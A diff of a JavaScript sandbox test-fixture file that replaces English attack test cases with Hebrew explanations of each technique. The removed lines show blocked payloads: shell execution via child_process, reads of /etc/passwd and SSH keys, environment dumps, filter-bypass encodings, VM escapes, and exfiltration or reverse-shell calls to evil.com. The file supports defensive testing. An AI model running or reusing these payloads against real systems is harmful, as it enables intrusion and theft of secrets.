@@ -1,27 +1,6 @@
-/**
- * JavaScript Security Attack Vectors
- * 
- * Educational test cases demonstrating common attack patterns
- * that malicious users might attempt in a web-based code execution environment.
- * 
- * Each test includes:
- * - name: Test identifier
- * - code: The malicious code attempt
- * - expectBlocked: Whether this should be blocked (true) or allowed (false)
- * - category: Attack category for grouping
- * - explanation: Human-readable description of how hackers use this attack
- */
-
-export const javascriptTests = [
-  // ════════════════════════════════════════════════════════════════
-  // COMMAND EXECUTION ATTACKS
-  // ════════════════════════════════════════════════════════════════
-  {
-    name: 'JS: child_process require',
-    code: `const { exec } = require('child_process'); exec('whoami', (err, stdout) => console.log(stdout));`,
-    expectBlocked: true,
-    category: 'command_execution',
-    explanation: `      
+/** Hebrew explanations keyed by the canonical English fixture name. */
+export const javascriptExplanations = Object.freeze({
+  "JS: child_process require": `
       🎯 התקפה: הרצת פקודות Shell דרך child_process
 
       איך האקרים משתמשים בזה:
@@ -39,13 +18,7 @@ export const javascriptTests = [
       2. השרת מוריד ומריץ את הסקריפט של התוקף
       3. התוקף מקבל גישה מתמשכת לשרת
     `,
-  },
-  {
-    name: 'JS: child_process import',
-    code: `import { exec } from 'child_process'; exec('ls -la');`,
-    expectBlocked: true,
-    category: 'command_execution',
-    explanation: `      
+  "JS: child_process import": `
       🎯 התקפה: ייבוא ES Module של child_process
 
       איך האקרים משתמשים בזה:
@@ -57,13 +30,7 @@ export const javascriptTests = [
       - מיפוי מבנה התיקיות של השרת להמשך התקפה
       - זיהוי תוכנות וגרסאות מותקנות לצורך ניצול ממוקד
     `,
-  },
-  {
-    name: 'JS: spawn command',
-    code: `import { spawn } from 'child_process'; spawn('cat', ['/etc/passwd']);`,
-    expectBlocked: true,
-    category: 'command_execution',
-    explanation: `      
+  "JS: spawn command": `
       🎯 התקפה: יצירת תהליך עם ארגומנטים
 
       איך האקרים משתמשים בזה:
@@ -75,13 +42,7 @@ export const javascriptTests = [
       - הרצת תהליכי רקע שממשיכים לפעול אחרי שהסקריפט הראשי מסתיים
       - הרצת קבצים בינאריים עם שילובי ארגומנטים מורכבים
     `,
-  },
-  {
-    name: 'JS: execSync command',
-    code: `const { execSync } = require('child_process'); console.log(execSync('id').toString());`,
-    expectBlocked: true,
-    category: 'command_execution',
-    explanation: `      
+  "JS: execSync command": `
       🎯 התקפה: הרצת פקודה סינכרונית
 
       איך האקרים משתמשים בזה:
@@ -93,13 +54,7 @@ export const javascriptTests = [
       - בדיקת הרשאות משתמש: execSync('id') מציג אם התהליך רץ כ-root
       - אמין יותר מהרצה אסינכרונית כאשר התוקף צריך תוצאה מיידית
     `,
-  },
-  {
-    name: 'JS: execFile command',
-    code: `import { execFile } from 'child_process'; execFile('/bin/ls', ['-la'], (e, out) => console.log(out));`,
-    expectBlocked: true,
-    category: 'command_execution',
-    explanation: `      
+  "JS: execFile command": `
       🎯 התקפה: הרצת קובץ בינארי ישירות
 
       איך האקרים משתמשים בזה:
@@ -111,13 +66,7 @@ export const javascriptTests = [
       - הרצת כלי מערכת בלי לוגים של Shell
       - הימנעות מבעיות escaping של Shell לצורך ניצול יציב יותר
     `,
-  },
-  {
-    name: 'JS: fork process',
-    code: `import { fork } from 'child_process'; fork('./malicious.js');`,
-    expectBlocked: true,
-    category: 'command_execution',
-    explanation: `      
+  "JS: fork process": `
       🎯 התקפה: פיצול תהליכי Node.js
 
       איך האקרים משתמשים בזה:
@@ -129,13 +78,7 @@ export const javascriptTests = [
       - יצירת רשת תהליכים להתקפות מבוזרות
       - שמירה על התמדה גם אם התהליך הראשי נהרג
     `,
-  },
-  {
-    name: 'JS: Dynamic require bypass',
-    code: `const m = 'child_' + 'process'; const cp = require(m); cp.exec('whoami');`,
-    expectBlocked: true,
-    category: 'command_execution',
-    explanation: `      
+  "JS: Dynamic require bypass": `
       🎯 התקפה: עקיפת מסננים באמצעות חיבור מחרוזות
 
       איך האקרים משתמשים בזה:
@@ -147,13 +90,7 @@ export const javascriptTests = [
       - לכן צריך לחסום כל require דינמי, לא רק שמות מודולים ספציפיים
       - מאלץ את האבטחה לחשוב על ניתוח סמנטי, לא רק על התאמת מחרוזות
     `,
-  },
-  {
-    name: 'JS: String concatenation bypass',
-    code: `const name = ['child', '_', 'process'].join(''); require(name).exec('id');`,
-    expectBlocked: true,
-    category: 'command_execution',
-    explanation: `      
+  "JS: String concatenation bypass": `
       🎯 התקפה: עקיפת מסננים באמצעות Array.join
 
       איך האקרים משתמשים בזה:
@@ -165,17 +102,7 @@ export const javascriptTests = [
       - ניתן לשילוב עם קידוד כדי לטשטש עוד יותר
       - מדגים למה allowlist עדיף על blocklist
     `,
-  },
-
-  // ════════════════════════════════════════════════════════════════
-  // FILE SYSTEM ATTACKS
-  // ════════════════════════════════════════════════════════════════
-  {
-    name: 'JS: fs module import',
-    code: `import * as fs from 'fs'; console.log(fs.readFileSync('/etc/passwd', 'utf8'));`,
-    expectBlocked: true,
-    category: 'file_system',
-    explanation: `      
+  "JS: fs module import": `
       🎯 התקפה: גישה למערכת הקבצים דרך מודול fs
 
       איך האקרים משתמשים בזה:
@@ -188,13 +115,7 @@ export const javascriptTests = [
       - שינוי קוד האפליקציה כדי להזריק דלתות אחוריות
       - קריאת מפתחות SSH פרטיים לצורך תנועה רוחבית
     `,
-  },
-  {
-    name: 'JS: fs/promises import',
-    code: `import { readFile } from 'fs/promises'; const data = await readFile('/etc/passwd');`,
-    expectBlocked: true,
-    category: 'file_system',
-    explanation: `      
+  "JS: fs/promises import": `
       🎯 התקפה: גישה לקבצים מבוססת Promises
 
       איך האקרים משתמשים בזה:
@@ -206,13 +127,7 @@ export const javascriptTests = [
       - לעיתים נשכח במסננים שבודקים רק fs
       - חלק מאסטרטגיית חסימה מקיפה של fs
     `,
-  },
-  {
-    name: 'JS: fs writeFile',
-    code: `import { writeFileSync } from 'fs'; writeFileSync('/tmp/backdoor.js', 'malicious code');`,
-    expectBlocked: true,
-    category: 'file_system',
-    explanation: `      
+  "JS: fs writeFile": `
       🎯 התקפה: כתיבת קבצים זדוניים
 
       איך האקרים משתמשים בזה:
@@ -225,13 +140,7 @@ export const javascriptTests = [
       - החלפת קוד לגיטימי בגרסאות טרויאניות
       - יצירת SSH authorized_keys לגישה אחורית
     `,
-  },
-  {
-    name: 'JS: fs require',
-    code: `const fs = require('fs'); fs.readdirSync('/').forEach(f => console.log(f));`,
-    expectBlocked: true,
-    category: 'file_system',
-    explanation: `      
+  "JS: fs require": `
       🎯 התקפה: סריקת תיקיות
 
       איך האקרים משתמשים בזה:
@@ -244,13 +153,7 @@ export const javascriptTests = [
       - מציאת קבצי לוג עם מידע רגיש
       - איתור תיקיות בית של משתמשים אחרים
     `,
-  },
-  {
-    name: 'JS: node:fs import',
-    code: `import fs from 'node:fs'; fs.readFileSync('/root/.ssh/id_rsa');`,
-    expectBlocked: true,
-    category: 'file_system',
-    explanation: `      
+  "JS: node:fs import": `
       🎯 התקפה: עקיפת ייבוא באמצעות פרוטוקול node:
 
       איך האקרים משתמשים בזה:
@@ -262,17 +165,7 @@ export const javascriptTests = [
       - אותן יכולות כמו fs רגיל, דרך נתיב ייבוא אחר
       - בדיקת היסודיות של חסימת import
     `,
-  },
-
-  // ════════════════════════════════════════════════════════════════
-  // NETWORK ATTACKS
-  // ════════════════════════════════════════════════════════════════
-  {
-    name: 'JS: http module',
-    code: `const http = require('http'); http.get('http://evil.com/steal?data=secret');`,
-    expectBlocked: true,
-    category: 'network',
-    explanation: `      
+  "JS: http module": `
       🎯 התקפה: חילוץ מידע דרך HTTP
 
       איך האקרים משתמשים בזה:
@@ -285,13 +178,7 @@ export const javascriptTests = [
       - התחברות לשרתי Command & Control (C2)
       - תקיפת מערכות אחרות
     `,
-  },
-  {
-    name: 'JS: https module',
-    code: `const https = require('https'); https.get('https://evil.com/beacon');`,
-    expectBlocked: true,
-    category: 'network',
-    explanation: `      
+  "JS: https module": `
       🎯 התקפה: חילוץ מידע מוצפן
 
       איך האקרים משתמשים בזה:
@@ -303,13 +190,7 @@ export const javascriptTests = [
       - התחזות לתעבורת HTTPS לגיטימית
       - קשה יותר להבדיל מפניות API רגילות
     `,
-  },
-  {
-    name: 'JS: net module',
-    code: `const net = require('net'); net.connect(4444, 'evil.com');`,
-    expectBlocked: true,
-    category: 'network',
-    explanation: `      
+  "JS: net module": `
       🎯 התקפה: חיבור TCP גולמי, Reverse Shell
 
       איך האקרים משתמשים בזה:
@@ -322,13 +203,7 @@ export const javascriptTests = [
       - יצירת ערוצים סמויים לחילוץ מידע
       - סריקת פורטים ומודיעין רשת
     `,
-  },
-  {
-    name: 'JS: dgram (UDP)',
-    code: `const dgram = require('dgram'); const s = dgram.createSocket('udp4');`,
-    expectBlocked: true,
-    category: 'network',
-    explanation: `      
+  "JS: dgram (UDP)": `
       🎯 התקפה: תקשורת מבוססת UDP
 
       איך האקרים משתמשים בזה:
@@ -340,13 +215,7 @@ export const javascriptTests = [
       - השתתפות בהתקפות DDoS amplification
       - תקשורת סמויה שמתחמקת מניטור TCP
     `,
-  },
-  {
-    name: 'JS: fetch API',
-    code: `fetch('https://evil.com/collect', { method: 'POST', body: JSON.stringify(secrets) });`,
-    expectBlocked: true,
-    category: 'network',
-    explanation: `      
+  "JS: fetch API": `
       🎯 התקפה: חילוץ מידע HTTP מודרני
 
       איך האקרים משתמשים בזה:
@@ -358,13 +227,7 @@ export const javascriptTests = [
       - קריאות API לתשתית של התוקף
       - תחביר נקי יותר ממודול http, ולעיתים מתפספס במסננים
     `,
-  },
-  {
-    name: 'JS: WebSocket',
-    code: `const ws = new WebSocket('wss://evil.com/shell'); ws.onopen = () => ws.send('connected');`,
-    expectBlocked: true,
-    category: 'network',
-    explanation: `      
+  "JS: WebSocket": `
       🎯 התקפה: חיבור WebSocket מתמשך
 
       איך האקרים משתמשים בזה:
@@ -377,17 +240,7 @@ export const javascriptTests = [
       - חיבור מתמשך ששורד טעינות מחדש של עמוד
       - קשה יותר לזיהוי מבקשות HTTP חוזרות
     `,
-  },
-
-  // ════════════════════════════════════════════════════════════════
-  // SYSTEM ACCESS ATTACKS
-  // ════════════════════════════════════════════════════════════════
-  {
-    name: 'JS: process.env access',
-    code: `console.log(process.env);`,
-    expectBlocked: true,
-    category: 'system_access',
-    explanation: `      
+  "JS: process.env access": `
       🎯 התקפה: גניבת משתני סביבה
 
       איך האקרים משתמשים בזה:
@@ -400,13 +253,7 @@ export const javascriptTests = [
       - מציאת JWT_SECRET כדי לזייף אסימוני אימות
       - גישה ל-STRIPE_SECRET_KEY לצורך הונאה פיננסית
     `,
-  },
-  {
-    name: 'JS: process.exit',
-    code: `process.exit(1);`,
-    expectBlocked: true,
-    category: 'system_access',
-    explanation: `      
+  "JS: process.exit": `
       🎯 התקפה: מניעת שירות (DoS)
 
       איך האקרים משתמשים בזה:
@@ -419,13 +266,7 @@ export const javascriptTests = [
       - חלק מהתקפות סחיטה או כופר
       - טשטוש עקבות באמצעות קריסה לפני רישום לוגים
     `,
-  },
-  {
-    name: 'JS: process.kill',
-    code: `process.kill(process.pid, 'SIGKILL');`,
-    expectBlocked: true,
-    category: 'system_access',
-    explanation: `      
+  "JS: process.kill": `
       🎯 התקפה: סיום תהליך
 
       איך האקרים משתמשים בזה:
@@ -437,13 +278,7 @@ export const javascriptTests = [
       - הריגת תהליכים אחרים במערכת, אם ההרשאות מאפשרות
       - שיבוש שירותים קשורים
     `,
-  },
-  {
-    name: 'JS: process.cwd',
-    code: `console.log(process.cwd());`,
-    expectBlocked: true,
-    category: 'system_access',
-    explanation: `      
+  "JS: process.cwd": `
       🎯 התקפה: חשיפת נתיב
 
       איך האקרים משתמשים בזה:
@@ -455,13 +290,7 @@ export const javascriptTests = [
       - עזרה בבניית התקפות path traversal
       - איסוף מידע לצורך ניצול ממוקד
     `,
-  },
-  {
-    name: 'JS: os module',
-    code: `const os = require('os'); console.log(os.hostname(), os.userInfo());`,
-    expectBlocked: true,
-    category: 'system_access',
-    explanation: `      
+  "JS: os module": `
       🎯 התקפה: איסוף מידע על המערכת
 
       איך האקרים משתמשים בזה:
@@ -474,13 +303,7 @@ export const javascriptTests = [
       - זיהוי גרסת מערכת הפעלה לצורך ניצול ממוקד
       - מדידת זיכרון זמין להתקפות משאבים
     `,
-  },
-  {
-    name: 'JS: cluster module',
-    code: `const cluster = require('cluster'); if (cluster.isMaster) cluster.fork();`,
-    expectBlocked: true,
-    category: 'system_access',
-    explanation: `      
+  "JS: cluster module": `
       🎯 התקפה: הכפלת תהליכים, Fork Bomb
 
       איך האקרים משתמשים בזה:
@@ -492,13 +315,7 @@ export const javascriptTests = [
       - קריסת כל השרת
       - פגיעה באפליקציות אחרות באחסון משותף
     `,
-  },
-  {
-    name: 'JS: worker_threads',
-    code: `const { Worker } = require('worker_threads'); new Worker('./evil.js');`,
-    expectBlocked: true,
-    category: 'system_access',
-    explanation: `      
+  "JS: worker_threads": `
       🎯 התקפה: הרצת Thread ברקע
 
       איך האקרים משתמשים בזה:
@@ -510,13 +327,7 @@ export const javascriptTests = [
       - הרצת קוד ששורד סיום של ה-thread הראשי
       - עיבוד מקבילי לגניבת מידע מהירה יותר
     `,
-  },
-  {
-    name: 'JS: vm module',
-    code: `const vm = require('vm'); vm.runInNewContext('process.exit()');`,
-    expectBlocked: true,
-    category: 'system_access',
-    explanation: `      
+  "JS: vm module": `
       🎯 התקפה: בריחה מ-VM Sandbox
 
       איך האקרים משתמשים בזה:
@@ -528,17 +339,7 @@ export const javascriptTests = [
       - גישה לאובייקטים גלובליים מתוך הקשר "מבודד"
       - הרצת קוד שרירותי עם הרשאות מלאות
     `,
-  },
-
-  // ════════════════════════════════════════════════════════════════
-  // CODE INJECTION ATTACKS
-  // ════════════════════════════════════════════════════════════════
-  {
-    name: 'JS: eval execution',
-    code: `eval("require('child_process').exec('whoami')");`,
-    expectBlocked: true,
-    category: 'code_injection',
-    explanation: `      
+  "JS: eval execution": `
       🎯 התקפה: הרצת קוד דינמית דרך eval()
 
       איך האקרים משתמשים בזה:
@@ -551,13 +352,7 @@ export const javascriptTests = [
       - שילוב עם קידוד כדי להתחמק מזיהוי
       - בעיית האבטחה הקלאסית של "eval is evil"
     `,
-  },
-  {
-    name: 'JS: Function constructor',
-    code: `const fn = new Function("return require('fs').readFileSync('/etc/passwd')"); fn();`,
-    expectBlocked: true,
-    category: 'code_injection',
-    explanation: `      
+  "JS: Function constructor": `
       🎯 התקפה: יצירת קוד דרך Function Constructor
 
       איך האקרים משתמשים בזה:
@@ -569,13 +364,7 @@ export const javascriptTests = [
       - יכול לבנות ולהריץ כל JavaScript
       - עקיפת CSP שחוסם eval אבל לא Function
     `,
-  },
-  {
-    name: 'JS: Dynamic import',
-    code: `const module = await import('child_' + 'process'); module.exec('whoami');`,
-    expectBlocked: true,
-    category: 'code_injection',
-    explanation: `      
+  "JS: Dynamic import": `
       🎯 התקפה: טעינת מודולים בזמן ריצה
 
       איך האקרים משתמשים בזה:
@@ -587,17 +376,7 @@ export const javascriptTests = [
       - טעינה מותנית כדי להתחמק מזיהוי
       - ייבוא מכתובות URL חיצוניות בחלק מהסביבות
     `,
-  },
-
-  // ════════════════════════════════════════════════════════════════
-  // MEMORY/BUFFER ATTACKS
-  // ════════════════════════════════════════════════════════════════
-  {
-    name: 'JS: Buffer.allocUnsafe',
-    code: `const buf = Buffer.allocUnsafe(1000); console.log(buf.toString());`,
-    expectBlocked: true,
-    category: 'memory_access',
-    explanation: `      
+  "JS: Buffer.allocUnsafe": `
       🎯 התקפה: חשיפת מידע מזיכרון
 
       איך האקרים משתמשים בזה:
@@ -610,17 +389,7 @@ export const javascriptTests = [
       - חילוץ מפתחות קריפטוגרפיים או סיסמאות
       - Memory forensics בלי גישה ישירה
     `,
-  },
-
-  // ════════════════════════════════════════════════════════════════
-  // ENCODING BYPASS ATTACKS
-  // ════════════════════════════════════════════════════════════════
-  {
-    name: 'JS: String.fromCharCode bypass',
-    code: `const cmd = String.fromCharCode(99,104,105,108,100,95,112,114,111,99,101,115,115); require(cmd);`,
-    expectBlocked: true,
-    category: 'encoding_bypass',
-    explanation: `      
+  "JS: String.fromCharCode bypass": `
       🎯 התקפה: טשטוש באמצעות קודי תווים
 
       איך האקרים משתמשים בזה:
@@ -633,13 +402,7 @@ export const javascriptTests = [
       - נפוץ בנוזקות וב-exploit kits
       - לכן חוסמים גם את פונקציות הקידוד עצמן
     `,
-  },
-  {
-    name: 'JS: atob base64 bypass',
-    code: `const mod = atob('Y2hpbGRfcHJvY2Vzcw=='); require(mod).exec('id');`,
-    expectBlocked: true,
-    category: 'encoding_bypass',
-    explanation: `      
+  "JS: atob base64 bypass": `
       🎯 התקפה: Payload מקודד Base64
 
       איך האקרים משתמשים בזה:
@@ -652,13 +415,7 @@ export const javascriptTests = [
       - טכניקה סטנדרטית בניצול חולשות Web
       - לעיתים משולבת עם שכבות קידוד נוספות
     `,
-  },
-  {
-    name: 'JS: Buffer.from decode bypass',
-    code: `const mod = Buffer.from('6368696c645f70726f63657373', 'hex').toString(); require(mod);`,
-    expectBlocked: true,
-    category: 'encoding_bypass',
-    explanation: `      
+  "JS: Buffer.from decode bypass": `
       🎯 התקפה: שם מודול מקודד Hex
 
       איך האקרים משתמשים בזה:
@@ -670,53 +427,31 @@ export const javascriptTests = [
       - יכול לעקוף מסננים שחוסמים Base64 אבל לא Hex
       - נפוץ בפיתוח exploits
     `,
-  },
-  {
-    name: 'JS: Unicode escape bypass',
-    code: `const p = '\\u0070\\u0072\\u006f\\u0063\\u0065\\u0073\\u0073'; console.log(global[p].env);`,
-    expectBlocked: true,
-    category: 'encoding_bypass',
-    explanation: `      
+  "JS: Unicode escape bypass": `
       🎯 התקפה: רצפי Unicode Escape
 
       איך האקרים משתמשים בזה:
       JavaScript תומך ב-unicode escapes בתוך מחרוזות. הרצף
-      \u0070\u0072\u006f\u0063\u0065\u0073\u0073 הוא process, ומשמש לגישה אל global.process.env.
+      process הוא process, ומשמש לגישה אל global.process.env.
 
       השפעה בעולם האמיתי:
       - עקיפת מסנני מילות מפתח
       - גישה למאפיינים חסומים באמצעות bracket notation
       - JavaScript חוקי שנראה כמו גיבוב חסר משמעות
     `,
-  },
-  {
-    name: 'JS: Hex escape bypass',
-    code: `const x = '\\x70\\x72\\x6f\\x63\\x65\\x73\\x73'; console.log(global[x].env);`,
-    expectBlocked: true,
-    category: 'encoding_bypass',
-    explanation: `      
+  "JS: Hex escape bypass": `
       🎯 התקפה: Hex Character Escapes
 
       איך האקרים משתמשים בזה:
       בדומה ל-unicode escapes, גם hex escapes מסתירים תוכן של מחרוזות.
-      \x70\x72\x6f\x63\x65\x73\x73 הוא process.
+      process הוא process.
 
       השפעה בעולם האמיתי:
       - קצר יותר מ-unicode escapes
       - יעיל באותה מידה לעקיפת מסננים
       - נפוץ ב-JavaScript obfuscators
     `,
-  },
-
-  // ════════════════════════════════════════════════════════════════
-  // PROTOTYPE POLLUTION ATTACKS
-  // ════════════════════════════════════════════════════════════════
-  {
-    name: 'JS: __proto__ pollution',
-    code: `({}).__proto__.polluted = 'pwned'; console.log({}.polluted);`,
-    expectBlocked: true,
-    category: 'prototype_pollution',
-    explanation: `      
+  "JS: __proto__ pollution": `
       🎯 התקפה: Prototype Pollution דרך __proto__
 
       איך האקרים משתמשים בזה:
@@ -729,13 +464,7 @@ export const javascriptTests = [
       - יכול להוביל ל-RCE בחלק מה-frameworks
       - CVE-2019-11358 ב-jQuery, CVE-2020-8203 ב-Lodash
     `,
-  },
-  {
-    name: 'JS: Object.setPrototypeOf pollution',
-    code: `Object.setPrototypeOf({}, { exec: () => 'pwned' });`,
-    expectBlocked: true,
-    category: 'prototype_pollution',
-    explanation: `      
+  "JS: Object.setPrototypeOf pollution": `
       🎯 התקפה: מניפולציה על Prototype דרך setPrototypeOf
 
       איך האקרים משתמשים בזה:
@@ -747,13 +476,7 @@ export const javascriptTests = [
       - שינוי התנהגות של טיפוסים מובנים
       - עקיפת בדיקות instanceof
     `,
-  },
-  {
-    name: 'JS: constructor.prototype pollution',
-    code: `const obj = {}; obj.constructor.prototype.polluted = true;`,
-    expectBlocked: true,
-    category: 'prototype_pollution',
-    explanation: `      
+  "JS: constructor.prototype pollution": `
       🎯 התקפה: Prototype Pollution דרך constructor
 
       איך האקרים משתמשים בזה:
@@ -765,17 +488,7 @@ export const javascriptTests = [
       - משפיע על כל האובייקטים שחולקים את אותו prototype
       - יכול להשחית את מצב האפליקציה באופן גלובלי
     `,
-  },
-
-  // ════════════════════════════════════════════════════════════════
-  // GLOBAL OBJECT ACCESS ATTACKS
-  // ════════════════════════════════════════════════════════════════
-  {
-    name: 'JS: globalThis access',
-    code: `console.log(globalThis.process.env);`,
-    expectBlocked: true,
-    category: 'global_access',
-    explanation: `      
+  "JS: globalThis access": `
       🎯 התקפה: גישה למשתני סביבה דרך globalThis
 
       איך האקרים משתמשים בזה:
@@ -787,13 +500,7 @@ export const javascriptTests = [
       - הגעה לכל אובייקט או פונקציה גלובליים
       - עובד גם בדפדפן וגם ב-Node.js
     `,
-  },
-  {
-    name: 'JS: global access',
-    code: `console.log(global.process.mainModule.require('child_process'));`,
-    expectBlocked: true,
-    category: 'global_access',
-    explanation: `      
+  "JS: global access": `
       🎯 התקפה: שרשרת אובייקט גלובלי של Node.js
 
       איך האקרים משתמשים בזה:
@@ -805,13 +512,7 @@ export const javascriptTests = [
       - גישה למודולים מסוכנים דרך שרשרת ה-prototype
       - טכניקת בריחה קלאסית מ-VM
     `,
-  },
-  {
-    name: 'JS: this.constructor escape',
-    code: `const p = this.constructor.constructor('return process')(); console.log(p.env);`,
-    expectBlocked: true,
-    category: 'global_access',
-    explanation: `      
+  "JS: this.constructor escape": `
       🎯 התקפה: בריחה מ-Sandbox דרך שרשרת Constructor
 
       איך האקרים משתמשים בזה:
@@ -823,17 +524,7 @@ export const javascriptTests = [
       - גישה ל-process גם בהקשרים "מוגבלים"
       - טכניקה מוכרת בתחרויות CTF
     `,
-  },
-
-  // ════════════════════════════════════════════════════════════════
-  // REFLECT/PROXY ATTACKS
-  // ════════════════════════════════════════════════════════════════
-  {
-    name: 'JS: Reflect.get bypass',
-    code: `const p = Reflect.get(global, 'process'); console.log(p.env);`,
-    expectBlocked: true,
-    category: 'reflect_proxy',
-    explanation: `      
+  "JS: Reflect.get bypass": `
       🎯 התקפה: גישה למאפיינים באמצעות Reflection
 
       איך האקרים משתמשים בזה:
@@ -845,13 +536,7 @@ export const javascriptTests = [
       - גישה למאפיינים דרך reflection
       - חלופה לגישה ישירה למאפיינים
     `,
-  },
-  {
-    name: 'JS: Proxy trap',
-    code: `new Proxy({}, { get: () => require('fs') });`,
-    expectBlocked: true,
-    category: 'reflect_proxy',
-    explanation: `      
+  "JS: Proxy trap": `
       🎯 התקפה: Proxy Trap להרצת קוד
 
       איך האקרים משתמשים בזה:
@@ -863,17 +548,7 @@ export const javascriptTests = [
       - הסתרת התנהגות זדונית בתוך proxy handlers
       - יצירת אובייקטים עם תופעות לוואי מסוכנות
     `,
-  },
-
-  // ════════════════════════════════════════════════════════════════
-  // TIMER ABUSE ATTACKS
-  // ════════════════════════════════════════════════════════════════
-  {
-    name: 'JS: setTimeout eval',
-    code: `setTimeout("require('child_process').exec('id')", 0);`,
-    expectBlocked: true,
-    category: 'timer_abuse',
-    explanation: `      
+  "JS: setTimeout eval": `
       🎯 התקפה: הרצת קוד מושהית דרך setTimeout
 
       איך האקרים משתמשים בזה:
@@ -885,13 +560,7 @@ export const javascriptTests = [
       - הרצת קוד אחרי שבדיקות אבטחה הסתיימו
       - מקבילה ישנה ל-eval שלעיתים מתפספסת
     `,
-  },
-  {
-    name: 'JS: setInterval abuse',
-    code: `setInterval(() => { throw new Error('DoS'); }, 1);`,
-    expectBlocked: true,
-    category: 'timer_abuse',
-    explanation: `      
+  "JS: setInterval abuse": `
       🎯 התקפה: מניעת שירות מבוססת Interval
 
       איך האקרים משתמשים בזה:
@@ -903,13 +572,7 @@ export const javascriptTests = [
       - יצירת שגיאות מתמשכת
       - הצפת event loop
     `,
-  },
-  {
-    name: 'JS: setImmediate abuse',
-    code: `setImmediate(() => require('child_process').exec('id'));`,
-    expectBlocked: true,
-    category: 'timer_abuse',
-    explanation: `      
+  "JS: setImmediate abuse": `
       🎯 התקפה: הרצת Callback מיידית
 
       איך האקרים משתמשים בזה:
@@ -921,17 +584,7 @@ export const javascriptTests = [
       - ניצול race conditions
       - הצפת תור לצורך DoS
     `,
-  },
-
-  // ════════════════════════════════════════════════════════════════
-  // ASYNC EXPLOIT ATTACKS
-  // ════════════════════════════════════════════════════════════════
-  {
-    name: 'JS: Promise.resolve exec',
-    code: `Promise.resolve().then(() => require('child_process').exec('id'));`,
-    expectBlocked: true,
-    category: 'async_exploits',
-    explanation: `      
+  "JS: Promise.resolve exec": `
       🎯 התקפה: הרצה נדחית מבוססת Promise
 
       איך האקרים משתמשים בזה:
@@ -943,13 +596,7 @@ export const javascriptTests = [
       - התחמקות מניטור סינכרוני
       - שרשור כמה פעולות זדוניות
     `,
-  },
-  {
-    name: 'JS: queueMicrotask',
-    code: `queueMicrotask(() => require('fs').readFileSync('/etc/passwd'));`,
-    expectBlocked: true,
-    category: 'async_exploits',
-    explanation: `      
+  "JS: queueMicrotask": `
       🎯 התקפה: הזרקה לתור Microtask
 
       איך האקרים משתמשים בזה:
@@ -961,17 +608,7 @@ export const javascriptTests = [
       - הרצה לפני promise handlers בתור
       - התקפות עדינות שמבוססות על תזמון
     `,
-  },
-
-  // ════════════════════════════════════════════════════════════════
-  // DANGEROUS MODULE ATTACKS
-  // ════════════════════════════════════════════════════════════════
-  {
-    name: 'JS: crypto module',
-    code: `const crypto = require('crypto'); console.log(crypto.randomBytes(16));`,
-    expectBlocked: true,
-    category: 'dangerous_modules',
-    explanation: `      
+  "JS: crypto module": `
       🎯 התקפה: פעולות קריפטוגרפיות
 
       איך האקרים משתמשים בזה:
@@ -983,13 +620,7 @@ export const javascriptTests = [
       - יצירת ערוצים מאובטחים לחילוץ מידע
       - פעולות כריית מטבעות קריפטוגרפיים
     `,
-  },
-  {
-    name: 'JS: stream module',
-    code: `const stream = require('stream'); new stream.Readable();`,
-    expectBlocked: true,
-    category: 'dangerous_modules',
-    explanation: `      
+  "JS: stream module": `
       🎯 התקפה: עיבוד מידע מבוסס Streams
 
       איך האקרים משתמשים בזה:
@@ -1001,13 +632,7 @@ export const javascriptTests = [
       - עיבוד payloads בינאריים
       - יצירת pipes בין תהליכים
     `,
-  },
-  {
-    name: 'JS: zlib module',
-    code: `const zlib = require('zlib'); zlib.gzipSync('data');`,
-    expectBlocked: true,
-    category: 'dangerous_modules',
-    explanation: `      
+  "JS: zlib module": `
       🎯 התקפה: דחיסה לצורך התחמקות
 
       איך האקרים משתמשים בזה:
@@ -1019,65 +644,32 @@ export const javascriptTests = [
       - decompression bombs או zip bombs לצורך DoS
       - הסתרת קוד זדוני בארכיונים דחוסים
     `,
-  },
-
-  // ════════════════════════════════════════════════════════════════
-  // SAFE CODE (should execute successfully)
-  // ════════════════════════════════════════════════════════════════
-  {
-    name: 'JS: Safe console.log',
-    code: `console.log('Hello, World!');`,
-    expectBlocked: false,
-    expectedOutput: 'Hello, World!',
-    category: 'safe_code',
-    explanation: `      
+  "JS: Safe console.log": `
       ✅ בטוח: פלט בסיסי לקונסול
 
       זה קוד לגיטימי שאמור לרוץ:
       פלט פשוט לקונסול הוא הבסיס ללימוד קוד
       ולדיבוג. אין כאן סיכון אבטחה.
     `,
-  },
-  {
-    name: 'JS: Safe math',
-    code: `console.log(2 + 2);`,
-    expectBlocked: false,
-    expectedOutput: '4',
-    category: 'safe_code',
-    explanation: `      
+  "JS: Safe math": `
       ✅ בטוח: פעולות מתמטיות
 
       זה קוד לגיטימי שאמור לרוץ:
       פעולות חשבון בסיסיות הן יסוד בתכנות
       ואינן מהוות סיכון אבטחה.
     `,
-  },
-  {
-    name: 'JS: Safe array operations',
-    code: `const arr = [1,2,3].map(x => x * 2); console.log(arr.join(','));`,
-    expectBlocked: false,
-    expectedOutput: '2,4,6',
-    category: 'safe_code',
-    explanation: `      
+  "JS: Safe array operations": `
       ✅ בטוח: פעולות מערך
 
       זה קוד לגיטימי שאמור לרוץ:
       מתודות לעבודה עם מערכים כמו map, filter ו-join הן
       חיוניות לעיבוד נתונים.
     `,
-  },
-  {
-    name: 'JS: Safe async/await',
-    code: `const delay = ms => new Promise(r => setTimeout(r, ms)); await delay(10); console.log('done');`,
-    expectBlocked: false,
-    expectedOutput: 'done',
-    category: 'safe_code',
-    explanation: `      
+  "JS: Safe async/await": `
       ✅ בטוח: דפוסי Async/Await
 
       זה קוד לגיטימי שאמור לרוץ:
       קוד אסינכרוני מבוסס Promise עם השהיות קצרות הוא נפוץ ובטוח.
       חשוב ללמד דפוסים אסינכרוניים.
     `,
-  },
-];
+});
